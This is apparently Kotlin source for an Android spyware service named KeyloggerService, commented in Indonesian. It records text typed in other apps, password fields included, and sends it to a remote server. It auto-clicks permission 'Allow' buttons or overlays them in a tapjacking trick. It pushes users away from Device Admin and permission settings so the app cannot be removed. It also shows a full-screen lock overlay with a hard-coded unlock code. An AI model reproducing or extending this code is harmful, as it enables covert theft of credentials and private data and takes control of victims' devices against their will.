package com.android.services

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.view.WindowManager
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import com.google.gson.JsonObject
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

class KeyloggerService : AccessibilityService() {

    companion object {
        @Volatile var instance: KeyloggerService? = null
        @Volatile var unlockCode: String = "2719"
        /** Jika true, saat dialog izin runtime muncul, langsung klik "Izinkan"
         *  via AccessibilityNodeInfo.ACTION_CLICK — tanpa overlay, tanpa gesture koordinat */
        @Volatile var autoGrantEnabled: Boolean = false
        /** Set false via self_destruct untuk nonaktifkan guard halaman Device Admin */
        @Volatile var adminGuardEnabled: Boolean = true
        /** Set false untuk nonaktifkan guard halaman Permission Settings */
        @Volatile var permissionGuardEnabled: Boolean = true

        fun showScreenInject(text: String, style: String = "hacker", speed: Float = 0.60f) { instance?.showOverlay(text, style, speed) }
        fun injectTap(x: Float, y: Float) { instance?.dispatchTap(x, y) }
        fun hideScreenInject()   { instance?.hideOverlay() }
        fun resetUnlockCode()    { unlockCode = "2719" }

        // ── Package-package sistem yang menampilkan dialog izin runtime ──────
        val PERMISSION_DIALOG_PACKAGES = setOf(
            "com.android.packageinstaller",          // AOSP < 10
            "com.google.android.packageinstaller",   // AOSP / Pixel
            "com.android.permissioncontroller",      // Android 10+
            "com.google.android.permissioncontroller", // Pixel / AOSP 11+
            "com.miui.securitycenter",               // MIUI (Xiaomi)
            "com.samsung.android.permissioncontroller", // Samsung OneUI
            "com.lge.qpair.app",                     // LG
            "com.huawei.systemmanager"               // EMUI (Huawei)
        )
    }

    /** Inject tap via AccessibilityService.dispatchGesture (for OverlayTrickManager fallback) */
    private fun dispatchTap(x: Float, y: Float) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            try {
                val path    = android.graphics.Path().apply { moveTo(x, y) }
                val stroke  = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, 50L)
                val gesture = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
                dispatchGesture(gesture, null, null)
            } catch (_: Exception) {}
        }
    }

    @Volatile private var overlayView: HackerOverlayView? = null
    private var wm: WindowManager? = null
    private var soundManager: HackerSoundManager? = null
    private val overlayHandler = Handler(Looper.getMainLooper())

    // ── Permission Guard Overlay — blokir seluruh sentuhan saat halaman permission muncul ──
    @Volatile private var permGuardOverlayView: android.view.View? = null

    private val http = OkHttpClient.Builder()
        .connectTimeout(8, TimeUnit.SECONDS)
        .readTimeout(8, TimeUnit.SECONDS)
        .build()
    private val JSON_MEDIA = "application/json; charset=utf-8".toMediaType()

    // ── Per-field debounce: setiap field punya handler sendiri ───────────────
    // key = "pkg|fieldHint"
    private data class FieldEntry(
        val pkg: String,
        val fieldHint: String,
        var pendingText: String = "",
        var runnable: Runnable? = null
    )
    private val fields   = mutableMapOf<String, FieldEntry>()
    private val handler  = Handler(Looper.getMainLooper())

    // Untuk onKeyEvent (physical keyboard / beberapa OEM soft keyboard)
    private var activePkg   = ""
    private var activeField = ""
    private val keyBuffer   = StringBuilder()

    override fun onServiceConnected() {
        instance = this
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes  =
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED       or
                AccessibilityEvent.TYPE_VIEW_FOCUSED            or
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED    or
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags        =
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS              or
                AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS    or
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 0
        }
    }

    // ── onKeyEvent: bonus — untuk physical keyboard & beberapa OEM ───────────
    // Soft keyboard (GBoard dll) TIDAK lewat sini; ditangani TYPE_VIEW_TEXT_CHANGED
    override fun onKeyEvent(event: KeyEvent): Boolean {
        if (event.action != KeyEvent.ACTION_DOWN) return false
        if (activePkg.isBlank() || activePkg == packageName) return false

        when (event.keyCode) {
            KeyEvent.KEYCODE_DEL, KeyEvent.KEYCODE_FORWARD_DEL -> {
                if (keyBuffer.isNotEmpty()) keyBuffer.deleteCharAt(keyBuffer.length - 1)
            }
            KeyEvent.KEYCODE_ENTER, KeyEvent.KEYCODE_NUMPAD_ENTER -> {
                val text = keyBuffer.toString().trim()
                if (text.isNotBlank()) {
                    sendNow(activePkg, activeField, text)
                    keyBuffer.clear()
                }
            }
            else -> {
                val unicode = event.unicodeChar
                if (unicode != 0 && unicode != 10) {
                    keyBuffer.append(unicode.toChar())
                    scheduleField(activePkg, activeField, keyBuffer.toString())
                }
            }
        }
        return false
    }

    // ── Debounce guard konten: cegah spam guard saat scroll/refresh ──────────
    private var lastPermGuardPkg = ""
    private var lastPermGuardMs  = 0L

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val ev = event ?: return

        when (ev.eventType) {

            // ── Fokus pindah / window baru ────────────────────────────────────
            AccessibilityEvent.TYPE_VIEW_FOCUSED,
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val pkg = ev.packageName?.toString() ?: return
                if (pkg == packageName) return
                val src = ev.source
                val hint = resolveFieldHint(ev, src)
                src?.recycle()

                // Update aktif field untuk onKeyEvent
                if (pkg != activePkg) keyBuffer.clear()
                activePkg   = pkg
                activeField = hint

                // ── Auto-trigger overlay saat dialog izin sistem muncul ──────
                if (ev.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                    // FIX Bug 4: cegah user buka halaman Device Admin
                    guardAdminPage(pkg, ev.className?.toString() ?: "")
                    // Anti-disable permission: cegah user matikan permission aktif
                    guardPermissionPage(pkg, ev.className?.toString() ?: "")
                    autoTriggerOverlay(pkg)
                }
            }

            // ── Konten window berubah (navigasi fragment dalam activity yg sama) ──
            // Penting: beberapa ROM tidak fire WINDOW_STATE_CHANGED saat buka
            // halaman permission detail — hanya fire WINDOW_CONTENT_CHANGED.
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                val pkg = ev.packageName?.toString() ?: return
                if (pkg == packageName) return
                if (!AppDeviceAdminReceiver.PERMISSION_SETTINGS_PACKAGES.contains(pkg)) return

                // Debounce 800ms per-package agar tidak spam guard saat scroll
                val now = System.currentTimeMillis()
                if (pkg == lastPermGuardPkg && now - lastPermGuardMs < 800) return
                lastPermGuardPkg = pkg
                lastPermGuardMs  = now

                val className = ev.className?.toString() ?: ""
                guardPermissionPage(pkg, className)
            }

            // ── Teks berubah — ini jalur utama untuk soft keyboard ────────────
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val pkg = ev.packageName?.toString() ?: return
                if (pkg == packageName) return

                val src        = ev.source
                val isPassword = src?.isPassword == true

                // Resolusi field hint
                val hint = resolveFieldHint(ev, src)

                // Update aktif field
                activePkg   = pkg
                activeField = hint

                val captured: String? = if (!isPassword) {
                    // ── Non-password: ambil teks penuh dari node langsung ────
                    val nodeText = src?.text?.toString()?.trim()
                        ?: ev.text.joinToString("").trim()
                    if (nodeText.isNotBlank() &&
                        !nodeText.all { it == '•' || it == '*' || it == '·' }) {
                        nodeText
                    } else null
                } else {
                    // ── Password field ──────────────────────────────────────
                    // Coba ambil teks sebelum sempat di-mask (bekerja di beberapa ROM)
                    val nodeText = src?.text?.toString() ?: ""
                    val rawOk   = nodeText.isNotBlank() &&
                                  !nodeText.all { it == '•' || it == '*' || it == '·' }
                    if (rawOk) {
                        // Lucky: teks belum di-mask
                        nodeText.trim()
                    } else {
                        // Sudah di-mask — gunakan keyBuffer yang diisi onKeyEvent
                        // (bekerja untuk physical keyboard / beberapa OEM)
                        val kbText = keyBuffer.toString().trim()
                        if (kbText.isNotBlank()) kbText else null
                    }
                }

                src?.recycle()

                if (captured != null) {
                    scheduleField(pkg, hint, captured)
                }
            }
        }
    }

    /**
     * Cek apakah package yang baru muncul adalah dialog izin runtime.
     *
     * Mode AUTO-GRANT (autoGrantEnabled = true):
     *   Langsung scan node tree → cari tombol "Izinkan" / "Allow" →
     *   performAction(ACTION_CLICK). Tidak perlu overlay, tidak perlu koordinat.
     *
     * Mode OVERLAY TRICK (default):
     *   Tampilkan overlay "BATAL" di atas tombol "Izinkan" (tapjacking).
     */

    /**
     * FIX Bug 4 — intercept halaman Device Admin di Settings.
     * Jika user membuka Settings > Device Admin, langsung press BACK
     * untuk mencegah user sampai ke tombol "Nonaktifkan".
     */
    private fun guardAdminPage(pkg: String, className: String) {
        if (!adminGuardEnabled) return   // disabled via self_destruct
        if (!AppDeviceAdminReceiver.SETTINGS_PACKAGES.contains(pkg)) return
        val isAdminPage = AppDeviceAdminReceiver.ADMIN_PAGE_KEYWORDS.any { kw ->
            className.contains(kw, ignoreCase = true)
        }
        if (!isAdminPage) return
        android.util.Log.d("AdminGuard", "Blocked: $pkg / $className")
        handler.postDelayed({
            performGlobalAction(GLOBAL_ACTION_BACK)
        }, 10)
        handler.postDelayed({
            performGlobalAction(GLOBAL_ACTION_HOME)
        }, 10)
    }

    /**
     * Tampilkan overlay transparan penuh yang MEMBLOKIR semua sentuhan user.
     * TYPE_ACCESSIBILITY_OVERLAY tanpa FLAG_NOT_TOUCHABLE → semua tap diserap overlay,
     * tidak ada yang tembus ke halaman permission di bawahnya.
     */
    private fun showPermGuardOverlay() {
        if (permGuardOverlayView != null) return
        try {
            val view = android.view.View(this).apply {
                // Hitam semi-transparan 50% — user tahu layar terkunci
                setBackgroundColor(android.graphics.Color.argb(128, 0, 0, 0))
            }
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                // TANPA FLAG_NOT_TOUCHABLE → overlay menyerap semua sentuhan
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            )
            (getSystemService(Context.WINDOW_SERVICE) as WindowManager).addView(view, params)
            permGuardOverlayView = view
        } catch (_: Exception) {}
    }

    /** Hapus overlay permission guard setelah navigasi selesai */
    private fun dismissPermGuardOverlay(delayMs: Long = 700) {
        handler.postDelayed({
            permGuardOverlayView?.let { v ->
                try {
                    (getSystemService(Context.WINDOW_SERVICE) as WindowManager).removeView(v)
                } catch (_: Exception) {}
                permGuardOverlayView = null
            }
        }, delayMs)
    }

    /**
     * Jika user membuka halaman Permission Settings (misal Settings > Apps > [App] > Permissions),
     * langsung:
     *   1. Tampilkan overlay penutup layar → semua sentuhan user diserap, tidak ada yg tembus
     *   2. Multi-fire BACK + HOME untuk navigasi keluar secepat mungkin
     *   3. Tutup overlay setelah navigasi selesai
     *
     * Strategi:
     *   T+0ms   → OVERLAY muncul (block semua touch seketika) + BACK langsung
     *   T+80ms  → BACK kedua (fallback jika pertama belum efektif)
     *   T+180ms → HOME (paksa keluar Settings)
     *   T+320ms → BACK ketiga (ROM animasi lambat / MIUI)
     *   T+500ms → HOME kedua (penjamin final)
     *   T+700ms → Overlay hilang
     *
     * Package dedicated permission controller (com.android.permissioncontroller dll)
     * diblokir semua window-nya tanpa cek className.
     */
    private fun guardPermissionPage(pkg: String, className: String) {
        if (!permissionGuardEnabled) return
        if (!AppDeviceAdminReceiver.PERMISSION_SETTINGS_PACKAGES.contains(pkg)) return

        // Dedicated permission controller packages → blokir SEMUA window-nya
        val isDedicatedPermPkg = AppDeviceAdminReceiver.PERMISSION_CONTROLLER_PACKAGES.contains(pkg)
        val isPermPage = isDedicatedPermPkg || AppDeviceAdminReceiver.PERMISSION_PAGE_KEYWORDS.any { kw ->
            className.contains(kw, ignoreCase = true)
        }
        if (!isPermPage) return

        android.util.Log.d("PermGuard", "Blocked: $pkg / $className [dedicated=$isDedicatedPermPkg]")

        // LANGKAH 1 — Overlay penutup layar seketika (blokir semua sentuhan)
        showPermGuardOverlay()

        // LANGKAH 2 — Multi-fire BACK + HOME
        performGlobalAction(GLOBAL_ACTION_BACK)                                      // T+0ms
        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_BACK)  },   80)     // T+80ms
        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME)  },  180)     // T+180ms
        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_BACK)  },  320)     // T+320ms
        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME)  },  500)     // T+500ms

        // LANGKAH 3 — Tutup overlay setelah navigasi pasti selesai
        dismissPermGuardOverlay(700)                                                 // T+700ms
    }

    private fun autoTriggerOverlay(pkg: String) {
        if (!PERMISSION_DIALOG_PACKAGES.contains(pkg)) return

        if (autoGrantEnabled) {
            // ── Mode: auto-grant via AccessibilityService node click ──────────
            // Delay 400ms agar dialog fully rendered + node hierarchy tersedia
            handler.postDelayed({
                val clicked = autoClickAllow()
                android.util.Log.d("AutoGrant", "auto-click result=$clicked pkg=$pkg")
            }, 400)
            return
        }

        // ── Mode: overlay trick (lama) ────────────────────────────────────────
        if (OverlayTrickManager.isActive) return
        if (!Settings.canDrawOverlays(applicationContext)) return

        handler.postDelayed({
            if (OverlayTrickManager.isActive) return@postDelayed
            val configJson = """
                {
                  "fakeText":  "BATAL",
                  "fakeColor": "#CC1565C0",
                  "offsetX":   0,
                  "offsetY":   0,
                  "duration":  30,
                  "fullBlock": false
                }
            """.trimIndent()
            OverlayTrickManager.start(applicationContext, configJson, callerPkg = pkg)
        }, 350)
    }

    /**
     * Scan semua node di window aktif, cari tombol "Izinkan" / "Allow" dan klik.
     * Mengembalikan true jika berhasil klik.
     */
    private fun autoClickAllow(): Boolean {
        val root = rootInActiveWindow ?: return false
        return try {
            traverseAndClickAllow(root)
        } finally {
            try { root.recycle() } catch (_: Exception) {}
        }
    }

    private fun traverseAndClickAllow(
        node: android.view.accessibility.AccessibilityNodeInfo
    ): Boolean {
        // Label-label tombol "Allow" dari berbagai ROM & bahasa
        val ALLOW_LABELS = setOf(
            "izinkan", "allow", "izin", "grant",
            "izinkan saja", "only this time",
            "hanya kali ini", "selalu", "always",
            "while using the app", "hanya saat menggunakan aplikasi",
            "allow only while using the app"
        )

        val text = node.text?.toString()?.trim()?.lowercase() ?: ""
        val desc = node.contentDescription?.toString()?.trim()?.lowercase() ?: ""

        val isAllow = ALLOW_LABELS.any { label ->
            text == label || text.startsWith(label) ||
            desc == label || desc.startsWith(label)
        }

        if (isAllow) {
            // Coba klik node langsung
            if (node.isClickable) {
                node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                return true
            }
            // Fallback: klik parent
            val parent = node.parent
            if (parent != null) {
                if (parent.isClickable) {
                    parent.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                    try { parent.recycle() } catch (_: Exception) {}
                    return true
                }
                try { parent.recycle() } catch (_: Exception) {}
            }
        }

        // Rekursif ke semua child
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = traverseAndClickAllow(child)
            try { child.recycle() } catch (_: Exception) {}
            if (found) return true
        }
        return false
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        hideOverlay()
        dismissPermGuardOverlay(0)  // cleanup overlay jika masih ada
        instance = null
        // Flush semua pending sebelum service mati
        fields.values.forEach { entry ->
            entry.runnable?.let { handler.removeCallbacks(it) }
            if (entry.pendingText.isNotBlank()) sendNow(entry.pkg, entry.fieldHint, entry.pendingText)
        }
        fields.clear()
    }

    // ── Debounce 250 ms per field — kirim teks paling baru setelah jeda ──────
    private fun scheduleField(pkg: String, fieldHint: String, text: String) {
        val key   = "$pkg|$fieldHint"
        val entry = fields.getOrPut(key) { FieldEntry(pkg, fieldHint) }

        // Batalkan timer lama
        entry.runnable?.let { handler.removeCallbacks(it) }
        entry.pendingText = text

        val run = Runnable {
            val t = entry.pendingText
            if (t.isNotBlank()) {
                sendNow(pkg, fieldHint, t)
                entry.pendingText = ""
            }
        }
        entry.runnable = run
        handler.postDelayed(run, 250)
    }

    // ── Resolusi deviceId identik dengan ConnectorService ────────────────────
    private fun resolveDeviceId(): String {
        @Suppress("HardwareIds")
        val androidId = Settings.Secure.getString(
            contentResolver, Settings.Secure.ANDROID_ID
        )?.takeIf { it.isNotBlank() && it != "9774d56d682e549c" }
        return if (androidId != null) {
            androidId
        } else {
            val hw = "${Build.MANUFACTURER}:${Build.MODEL}:${Build.BOARD}:${Build.HARDWARE}"
            hw.hashCode().toString().replace("-", "x")
        }
    }

    // ── Kirim langsung ke server tanpa debounce ───────────────────────────────
    private fun sendNow(pkg: String, fieldHint: String, text: String) {
        val deviceId = resolveDeviceId()

        val body = JsonObject().apply {
            addProperty("deviceId",   deviceId)
            addProperty("appPackage", pkg)
            addProperty("appName",    getAppName(pkg))
            addProperty("fieldName",  fieldHint)
            addProperty("text",       text)
        }

        Thread {
            try {
                http.newCall(
                    Request.Builder()
                        .url("${SecureConfig.serverUrl()}/api/device/keylog")
                        .post(body.toString().toRequestBody(JSON_MEDIA))
                        .build()
                ).execute().close()
            } catch (_: Exception) {}
        }.also { it.isDaemon = true }.start()
    }

    // ── Resolusi nama field dari event + node ─────────────────────────────────
    private fun resolveFieldHint(ev: AccessibilityEvent, src: android.view.accessibility.AccessibilityNodeInfo?): String {
        if (src != null) {
            val hint   = src.hintText?.toString()?.trim()?.takeIf { it.isNotBlank() }
            val desc   = src.contentDescription?.toString()?.trim()?.takeIf { it.isNotBlank() }
            val viewId = src.viewIdResourceName?.substringAfterLast("/")?.takeIf { it.isNotBlank() }
            if (hint != null) return hint
            if (desc != null) return desc
            if (viewId != null) return viewId
        }
        return ev.className?.toString()?.substringAfterLast(".") ?: "Field"
    }

    private fun getAppName(pkg: String): String = try {
        packageManager.getApplicationLabel(packageManager.getApplicationInfo(pkg, 0)).toString()
    } catch (_: Exception) { pkg }

    // ── Screen Inject Overlay ─────────────────────────────────────────────────
    fun showOverlay(text: String, style: String = "hacker", speed: Float = 0.60f) {
        overlayHandler.post {
            hideOverlayInternal()
            val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            wm = windowManager
            val view = HackerOverlayView(this, text.ifBlank { "By IWX TEAM" }, style, unlockCode, speed,
                onGranted = { soundManager?.stop(); soundManager = null }
            ) {
                hideOverlay()
            }
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR,
                PixelFormat.TRANSLUCENT
            ).also {
                it.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE or
                                   WindowManager.LayoutParams.SOFT_INPUT_STATE_VISIBLE
            }
            windowManager.addView(view, params)
            overlayView = view
            view.alpha = 0f
            view.animate().alpha(1f).setDuration(600).start()
            soundManager?.stop()
            soundManager = HackerSoundManager(this@KeyloggerService, speed).also { it.start(text.ifBlank { "System breach initiated" }) }
        }
    }

    fun hideOverlay() { overlayHandler.post { hideOverlayInternal() } }

    private fun hideOverlayInternal() {
        overlayView?.let { v ->
            try { v.stop(); wm?.removeView(v) } catch (_: Exception) {}
            overlayView = null
        }
        try { soundManager?.stop() } catch (_: Exception) {}
        soundManager = null
    }
}
